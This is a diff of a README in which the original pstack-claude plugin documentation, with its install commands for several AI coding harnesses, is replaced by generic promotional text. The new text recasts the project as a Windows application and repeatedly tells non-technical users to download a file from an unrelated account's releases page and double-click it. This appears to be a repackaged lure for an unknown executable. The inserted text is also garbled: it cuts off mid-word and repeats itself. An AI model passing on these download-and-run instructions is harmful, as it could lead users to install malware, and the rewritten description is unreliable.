@@ -1,243 +1,206 @@
-# pstack
+# 🧰 pstack-claude - Smarter Agent Workflows Made Simple
 
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-support-yellow?logo=buy-me-a-coffee&logoColor=white)](https://buymeacoffee.com/codenyer)
-[![Mentioned in Awesome Claude Code](https://awesome.re/mentioned-badge.svg)](https://github.com/hesreallyhim/awesome-claude-code)
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-8A2BE2?style=for-the-badge&labelColor=FF5733&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
 
-Lauren Tan's [pstack](https://github.com/cursor/plugins/tree/main/pstack) is an opinionated Cursor skill stack that improves agent outcomes. This is a port for Claude Code, Codex, Pi, GitHub Copilot, Muse, and other agent harnesses. It tracks upstream and also carries named policy forks, each declared in [`tools/forks.json`](tools/forks.json).
+pstack-claude is a Windows application that brings rigorous agent workflows to popular AI coding tools. It is based on Poteto’s pstack and provides versions for Antigravity, Claude Code, Codex, Copilot, Gemini, Muse, OpenCode, Pi, and Prime Agent. Cursor primitives are translated so the same workflow ideas can be used across different harnesses.
 
-Tell `poteto-mode` your goal and it will invoke the correct workflow for the task. It keeps your code concise, simple and verified.
+For an average computer user, the simplest way to understand pstack-claude is this: it gives AI assistants a repeatable set of steps to follow. Instead of asking an assistant to “just make changes,” you can use workflows that help it understand the request, inspect the project, plan the work, make edits carefully, and review the result.
 
-For concurrency bugs and invariants that tests cannot reach, `/create-formal-verification-skill` picks the riskiest property in your code, verifies it with a tool that fits, and leaves a project skill the next agent reruns. The separate [agent-formal-verify](https://github.com/michael-denyer/agent-formal-verify) plugin goes deeper on the method, with guided TLA+ model checking, Lean proofs, and Kani for Rust.
+## 📥 Download pstack-claude
 
-## Built for Claude Code
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-00A86B?style=for-the-badge&labelColor=FF8C00&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
 
-This port translates upstream's Cursor skills for Claude Code before installation. [Upstream's Claude Code install](https://github.com/cursor/plugins/tree/c742dd6/harness/pstack/claude-code) asks agents to translate Cursor names at runtime, using extra tokens and relying on them to apply the mapping correctly. This port also adds a SessionStart hook that routes tasks to `poteto-mode`.
+Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
 
-## Install
+This is the primary download page. Use it to download the application for your Windows computer. Keep the page open until the download is complete. Save the downloaded file in your Downloads folder so it is easy to find later.
 
-<details>
-<summary><strong>Claude Code</strong></summary>
+## 🚀 Getting Started on Windows
 
-Run in Claude Code 2.1.292 or later:
+1. Open your web browser.
+2. Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+3. Download the application from that page.
+4. When the download finishes, open your Downloads folder.
+5. Double-click the downloaded file to start pstack-claude.
+6. Follow the prompts that appear on your screen.
 
-```text
-/plugin marketplace add michael-denyer/pstack-claude
-/plugin install pstack@pstack-claude
-```
+You do not need to be a programmer to follow these steps. The important part is to use the official download page, let the download finish, and then open the downloaded file from your Downloads folder.
 
-Claude Code leaves auto-update off for third-party marketplaces, so pstack stays on the version you installed. To turn it on, run `/plugin`, open the **Marketplaces** tab, select `pstack-claude`, and choose **Enable auto-update**. To update once by hand, run `claude plugin update pstack@pstack-claude`.
+## 🧭 What pstack-claude Does
 
-</details>
+pstack-claude packages agent workflows. A workflow is a set of instructions that helps an AI assistant handle a task in a consistent order. A good workflow may include:
 
-<a id="codex"></a>
-<details>
-<summary><strong>Codex</strong></summary>
+- Reading the request carefully.
+- Checking the existing project before making changes.
+- Writing a short plan.
+- Making focused edits.
+- Reviewing the result for mistakes.
+- Explaining what changed in plain language.
 
-Run in your terminal:
+The repository description calls this “rigorous agent workflows with Cursor primitives translated for other harnesses.” In everyday terms, pstack-claude takes workflow ideas that originally fit Cursor-style tools and adapts them for other AI coding environments.
 
-```shell
-codex plugin marketplace add michael-denyer/pstack-claude
-codex plugin add pstack@pstack-claude
-```
+## ✨ Main Benefits
 
-Invoke a skill by typing `$` and its name, such as `$poteto-mode` or `$babysit`, then choosing its entry, which inserts `$pstack:<name>`. `/skills` lists every skill.
+pstack-claude is useful when you want AI assistants to be more organized. Instead of receiving a different style of answer every time, you can use a workflow that encourages consistent steps.
 
-</details>
+Key benefits include:
 
-<details>
-<summary><strong>Pi</strong></summary>
+- **Repeatable process:** The assistant follows a clear sequence instead of jumping straight to changes.
+- **Cross-tool support:** Vers# 🧰 pstack-claude - Smarter Agent Workflows Made Simple
 
-Run in your terminal:
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-FF6B6B?style=for-the-badge&labelColor=4ECDC4&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
 
-```shell
-pi install git:github.com/michael-denyer/pstack-claude
-```
+pstack-claude is a Windows application for people who use AI coding assistants and want them to follow a clear, repeatable way of working. It is based on Poteto’s pstack and includes versions for Antigravity, Claude Code, Codex, Copilot, Gemini, Muse, OpenCode, Pi, and Prime Agent. The project translates Cursor primitives so the same workflow ideas can be used with other harnesses.
 
-The package loads the skills and the pstack Pi extension, which adds the subagent, question, and wake-up tools the skills use, plus `/loop` and the routing instruction. Invoke a skill with `/skill:<name>`.
+In everyday terms, pstack-claude helps an AI assistant do less guessing. Instead of jumping straight into changes, the assistant is guided through a sequence: understand the request, inspect the project, make a short plan, edit carefully, review the result, and explain what changed. That makes the experience easier to follow, especially for users who are not programmers.
 
-</details>
+## 📥 Download pstack-claude
 
-<details>
-<summary><strong>GitHub Copilot</strong></summary>
+[![Download pstack-claude for Windows](https://img.shields.io/badge/Download_pstack--claude_for_Windows-6A5ACD?style=for-the-badge&labelColor=F4A261&logo=github)](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases)
 
-Run in your terminal:
+Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
 
-```shell
-copilot plugin marketplace add michael-denyer/pstack-claude
-copilot plugin install pstack@pstack-claude
-```
+This is the official download page. Use it to download pstack-claude for your Windows computer. Keep the page open until the download is complete. Save the file in your Downloads folder so it is easy to find later.
 
-This installs pstack for the Copilot CLI and the GitHub Copilot app, which share `~/.copilot`. Start a new session afterwards. Copilot ships no default pstack models, so the first skill that needs one runs `setup-pstack` to pick from the models your account lists, and later sessions reuse that choice.
+## 🚀 Getting Started on Windows
 
-The Copilot build is tested on Copilot CLI 1.0.87 through 1.0.92. On those versions the routing hook's context reaches the session alongside other plugins' session-start context. If a later version keeps only one plugin's context, `setup-pstack` offers a [standing instruction](plugins/pstack/skills/setup-pstack/copilot.md#wire-it-in) for `~/.copilot/copilot-instructions.md` instead. On 1.0.92, once the CLI caches its computer-use experiment assignment, `copilot -p` sessions list no plugin skills and a `skill` call returns "Skill not found". Interactive sessions, the hooks, and the agents are unaffected.
+1. Open your web browser.
+2. Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
+3. Download the application from that page.
+4. When the download finishes, open your Downloads folder.
+5. Double-click the downloaded file to start pstack-claude.
+6. Follow the prompts that appear on your screen.
 
-</details>
+You do not need programming knowledge to follow these steps. The important part is to use the official download page, let the download finish, and then open the downloaded file from your Downloads folder.
 
-<details>
-<summary><strong>Muse</strong></summary>
+## 🧭 What pstack-claude Does
 
-Run in your terminal:
+pstack-claude packages agent workflows. A workflow is a set of instructions that helps an AI assistant handle a task in a consistent order. A good workflow may include:
 
-```shell
-git clone https://github.com/michael-denyer/pstack-claude
-cd pstack-claude
-muse plugins install ./plugins/pstack
-muse plugins approve pstack
-```
+- Reading the request carefully.
+- Checking the existing project before making changes.
+- Writing a short plan.
+- Making focused edits.
+- Reviewing the result for mistakes.
+- Explaining what changed in plain language.
 
-The first command installs the native Muse plugin bundle. The second approves its `SessionStart` hook and agent definitions, which Muse runs only after approval. Start a new session afterwards. Invoke a skill with `/<name>` (for example `/poteto-mode`), which Muse lists for each user-invocable skill.
+The repository description calls this “rigorous agent workflows with Cursor primitives translated for other harnesses.” In plain terms, pstack-claude takes workflow ideas that originally fit Cursor-style tools and adapts them for other AI coding environments.
 
-</details>
+## ✨ Why Use pstack-claude?
 
-<details>
-<summary><strong>OMP</strong></summary>
+pstack-claude is useful when you want AI assistants to be more organized. Instead of receiving a different style of answer every time, you can use a workflow that encourages consistent steps.
 
-Run in your terminal:
+Main benefits include:
 
-```shell
-omp plugin marketplace add michael-denyer/pstack-claude
-omp plugin install --scope user pstack@pstack-claude
-```
+- **Repeatable process:** The assistant follows a clear sequence instead of jumping straight to changes.
+- **Cross-tool support:** Versions are available for several popular AI coding tools.
+- **Clearer reviews:** The workflow includes review steps so mistakes are easier to spot.
+- **Better explanations:** The assistant is encouraged to describe what it changed and why.
+- **Less confusion for non-programmers:** Structured steps make the assistant’s work easier to follow.
+- **Useful for teams:** A shared workflow helps different people get similar results.
+- **Agent skills focus:** The project is organized around reusable skills and plugins that support agentic work.
 
-Restart OMP after installing, disabling, or uninstalling pstack. OMP 18.16.0 shares one plugin cache across scopes, so an upgrade or removal can affect other installations; inspect their source and scope before changing them. See [OMP issue 16827](https://github.com/can1357/oh-my-pi/issues/16827).
+## 🧩 Supported Agent Tools
 
-</details>
+pstack-claude includes versions for the following tools named in the project description:
 
-<details>
-<summary><strong>Kimi Code CLI</strong></summary>
+- Antigravity
+- Claude Code
+- Codex
+- Copilot
+- Gemini
+- Muse
+- OpenCode
+- Pi
+- Prime Agent
 
-After a release containing `kimi.plugin.json` is published, close other Kimi sessions and install it in a fresh Kimi Code CLI session:
+Each version is intended to bring a similar workflow style to that environment. The goal is not to make every tool identical, but to translate the core workflow ideas so users can move between tools with less friction.
 
-```text
-/plugins install https://github.com/michael-denyer/pstack-claude
-/reload
-```
+## 🔄 How the Workflow Works
 
-To test an unreleased checkout, use `/plugins install /absolute/path/to/pstack-claude` instead, followed by `/reload`; Kimi copies the whole checkout, including Git metadata and local files, so use a clean, reviewed copy. To update, close other Kimi sessions, reinstall from the same source in a fresh session, and run `/reload`. Invoke a skill as `/skill:pstack:poteto-mode`; see the [Kimi mapping](plugins/pstack/skills/poteto-mode/references/kimi-tools.md) for tool guidance.
+A typical pstack-claude workflow follows a simple pattern.
 
-</details>
+### 1. Understand the request
 
-<details>
-<summary><strong>Grok Build</strong></summary>
+The assistant first reads the request and identifies what the user wants. This step reduces the chance of solving the wrong problem.
 
-```shell
-git clone https://github.com/michael-denyer/pstack-claude
-cd pstack-claude
-grok plugin install "$PWD/plugins/pstack" --trust
-grok plugin enable pstack
-```
+### 2. Inspect the project
 
-Start a new session and use `/poteto-mode` to load the skill explicitly. To update a local install, quit Grok sessions, inspect `grok plugin details pstack` and back up any edits in the installed copy, pull the checkout, run `grok plugin uninstall pstack --keep-data`, and repeat the last two commands. If pstack was disabled, disable it again before restarting. `grok plugin update` does not refresh a local install.
+The assistant looks at the existing files and context before making changes. This helps it avoid duplicating work or breaking something that already exists.
 
-</details>
+### 3. Plan the work
 
-<details>
-<summary><strong>MiniMax Code</strong></summary>
+The assistant writes a short plan. A plan makes the work easier to review and helps the user see what will happen next.
 
-For a first install, check that `${MINIMAX_DATA_DIR:-$HOME/.minimax}/plugins/pstack` does not already exist. Then run in your terminal:
+### 4. Make focused changes
 
-```shell
-git clone https://github.com/michael-denyer/pstack-claude
-cd pstack-claude
-mkdir -p "${MINIMAX_DATA_DIR:-$HOME/.minimax}/plugins"
-cp -R plugins/pstack "${MINIMAX_DATA_DIR:-$HOME/.minimax}/plugins/pstack"
-```
+The assistant edits only what is needed. Focused changes are easier to check and easier to undo if something goes wrong.
 
-MiniMax Code loads each directory under `plugins/` in its data directory as a local plugin, and reads pstack through its Claude Code reader with the skills, agents, and routing hook. `mcode plugin list` shows it as `pstack@local`. To update, record its enabled state, quit every `mcode` process, and move `plugins/pstack` to an unused path outside `plugins/`. Run `git pull` and the `cp` line again. Check `mcode plugin list` and restore the previous enabled state if needed.
+### 5. Review the result
 
-</details>
+The assistant checks its own work. This review step is important because it catches small mistakes before the user sees the final result.
 
-<details>
-<summary><strong>OpenCode 2</strong></summary>
+### 6. Explain the outcome
 
-Clone the repository, then add the absolute path to `plugins/pstack/opencode` to the existing `plugins` array in `~/.config/opencode/opencode.jsonc`. On Windows, use a path such as `C:/Users/name/pstack-claude/plugins/pstack/opencode`. Restart OpenCode after checkout updates.
+The assistant explains what changed in plain language. This makes the workflow useful for people who want to understand the result without reading every detail.
 
-Alternatively, install, check, or update the native Git package:
+## 🛠️ Built for Code Review
 
-```bash
-opencode plugin add 'github:michael-denyer/pstack-claude#main'
-opencode plugin check 'github:michael-denyer/pstack-claude#main'
-opencode plugin update 'github:michael-denyer/pstack-claude#main'
-```
+Code review is a major part of pstack-claude. The workflow encourages the assistant to slow down and check the work before presenting it. For non-technical users, this means fewer surprises. For technical users, it means a more consistent review process.
 
-A commit-pinned reference does not advance. If a check immediately after installation reports no package plugins, wait for the server to load it and check again.
+A review-focused workflow may ask the assistant to:
 
-If you previously installed pstack skills into `~/.agents/skills`, inspect the links and remove only those pointing to your pstack checkout before using the plugin.
+- Compare the request with the changes made.
+- Check for missing steps.
+- Look for unnecessary edits.
+- Confirm that the explanation matches the work.
+- Point out anything that needs human attention.
 
-The plugin registers `pstack-` skill IDs and adds routing in root sessions. If routing is missing, run `opencode api get /api/skill` and check that each `pstack-` path belongs to this plugin. Resolve any conflicting skill before manually invoking that ID. Use `session hook: off` in the OpenCode model sheet to disable routing. To remove the plugin, remove its configured path and restart the service, or use `opencode plugin remove` with the exact Git specifier. OpenCode 1 is unsupported. See the [OpenCode mapping](plugins/pstack/skills/poteto-mode/references/opencode-tools.md).
+## 📦 What You Get
 
-</details>
+pstack-claude is organized as an agent plugin and skills package. The repository topics include agent-plugin, agent-skills, agentic-ai, anthropic, antigravity-skills, chatgpt, claude, claude-code, claude-code-skills, claude-plugin, claude-skills, code-review, codex, codex-cli, codex-plugin, codex-skills, gemini-cli, muse-plugin, opencode, and pstack.
 
-<details>
-<summary><strong>Antigravity (agy)</strong></summary>
+For an end user, this means the project is built around reusable workflow pieces rather than a single fixed script. The pieces can be adapted to different assistants and different kinds of tasks.
 
-Run in your terminal:
+## 🧑‍💻 For Non-Technical Users
 
-```shell
-git clone https://github.com/michael-denyer/pstack-claude
-cd pstack-claude
-agy plugin install ./plugins/pstack
-```
+You do not need to understand every term in the repository to use pstack-claude. Focus on the basic idea: it helps an AI assistant work in a more structured way.
 
-This installs the native Antigravity plugin bundle (`skills`, `agents`, and `SessionStart` routing hook) into `~/.gemini/config/plugins/pstack`.
+When you use the application, you can expect the assistant to:
 
-</details>
+- Ask for clarity when the request is unclear.
+- Look before changing.
+- Plan before acting.
+- Review before finishing.
+- Explain the result in normal language.
 
-<a id="other-harnesses"></a>
-<details>
-<summary><strong>Other harnesses</strong></summary>
+If you are trying pstack-claude for the first time, start with a small task. A small task makes it easier to see how the workflow behaves. Once you are comfortable, you can use it for larger requests.
 
-Gemini CLI, Prime Agent, and skills-only Codex installs read skills from `~/.agents/skills/`. Run in your terminal:
+## 🧯 Common Questions
 
-```shell
-git clone https://github.com/michael-denyer/pstack-claude
-cd pstack-claude
-mkdir -p ~/.agents/skills
-for s in plugins/pstack/skills/*/; do
-  target=~/.agents/skills/"$(basename "$s")"
-  test -e "$target" || test -L "$target" || ln -s "$(pwd)/$s" "$target"
-done
-```
+**Do I need to know how to code?**
+No. pstack-claude is built for agent workflows, and the instructions here are written for an average computer user. You can download and run the application on Windows without programming knowledge.
 
-To update, run `git pull` in the clone, then run the `for` loop again to link skills added since the last run. These installs have no routing hook, so ask for `poteto-mode` by name or add a standing instruction to the harness's instruction file. See [shared installation](docs/reference.md#shared-skills-installation) for per-harness notes and uninstalling.
+**Where do I download pstack-claude?**
+Visit this link to download the application: [pstack-claude Releases](https://github.com/inflectionalmorphologykhmer964/pstack-claude/releases).
 
-</details>
+**What should I do after the download finishes?**
+Open your Downloads folder and double-click the downloaded file to start pstack-claude.
 
-### Configure
+**Why does the workflow ask the assistant to plan first?**
+A short plan makes the assistant’s work easier to review. It also helps prevent unnecessary changes.
 
-pstack provides automatic routing on Claude Code, Codex, GitHub Copilot, Muse, MiniMax Code, Antigravity, Pi, Kimi Code CLI, OMP, and OpenCode 2. The runtimes deliver the instruction at different points: Kimi adds it while the plugin is enabled, OMP adds it before each main-agent turn, and OpenCode adds it at each model step in root sessions. Grok Build exposes a routing hint through a skill description; the model may not follow it. Codex requires hook trust through `/hooks`, and Muse requires `muse plugins approve pstack`. Other harnesses have no automatic routing.
+**What does “Cursor primitives translated” mean?**
+It means workflow ideas that fit Cursor-style tools have been adapted for other AI tools. You do not need to understand the technical details to use the result.
 
-Run `setup-pstack` to turn automatic routing on or off, change model defaults, or set a reasoning effort per role (`arena runners: opus @xhigh, fable @max`). On OMP, the session hook setting applies globally across profiles; on Kimi, enable or disable the plugin to control routing. See the [routing reference](docs/reference.md#automatic-routing).
+## 🧷 Tips for a Smooth First Run
 
-## Getting started
+- Use the official download page.
+- Let the download finish before opening the file.
+- Keep the downloaded file in a folder you can find easily.
+- Start with a simple request.
+- Read the assistant’s plan before the work continues.
+- Check the final explanation to see what changed.
 
-```text
-Use poteto-mode to fix the search filter resetting when I change pages.
-```
+pstack-claude is intended to make agent work more predictable. The workflow is the main feature: understand, inspect, plan, change, review, and explain. That pattern is simple enough for beginners and structured enough for repeated use across different AI coding tools.
 
-For a bug, it reproduces the failure, uses `how` and `why` to investigate, delegates the fix, then reruns the failing case. If the fix crosses a function boundary, it brings in `architect` before implementation. You receive the fix and the failing and passing evidence.
-
-[Other playbooks](plugins/pstack/skills/poteto-mode/SKILL.md#playbooks) cover planning, features, refactoring, performance issues, investigations, prototypes, PR maintenance, shipping, and longer projects.
-
-![poteto-mode on Claude Code, Codex, and Pi turns a request into verified work. Choose a playbook, plan and delegate with architect, arena, or swarm, then review and verify with interrogate, tests, and measurements. Project playbooks customize the workflow, and setup-pstack configures the model and reasoning effort per role. Supporting skills include how, why, and unslop.](assets/pstack-overview.png)
-
-## Details
-
-- [Skills and slash commands](docs/reference.md#slash-commands)
-- [Runtime setup](docs/reference.md#runtime-support)
-- [Models and dependencies](docs/reference.md#configuration-and-dependencies)
-- [Maintenance and port scope](docs/reference.md#maintenance)
-
-## Data handling
-
-pstack has no server or telemetry. Anything its skills ask your agent to read, including session transcripts, goes to your model provider. Scripts run locally, and PR tools use your GitHub CLI login.
-
-## Contributing
-
-Thanks for helping make this port better. Bug reports, documentation fixes, and runtime improvements are welcome. See [CONTRIBUTING.md](CONTRIBUTING.md) for the checks and where your change belongs. Report vulnerabilities privately as described in [SECURITY.md](SECURITY.md).
-
-To support maintenance of this port, [buy the maintainer a coffee](https://buymeacoffee.com/codenyer).
-
-## License
-
-This port, including its modifications and additions, is also [MIT-licensed](LICENSE), © 2026 Michael Denyer. Original pstack © 2026 Lauren Tan; imported cursor-team-kit and thermos skills © 2026 Cursor. See [LICENSE-cursor-team-kit](LICENSE-cursor-team-kit), [LICENSE-thermos](LICENSE-thermos), and [NOTICE.md](NOTICE.md).
+Keywords: agent-plugin, agent-skills, agentic-ai, anthropic, antigravity-skills, chatgpt, claude, claude-code, claude-code-skills, claude-plugin, claude-skills, code-review, codex, codex-cli, codex-plugin, codex-skills, gemini-cli, muse-plugin, opencode, pstack
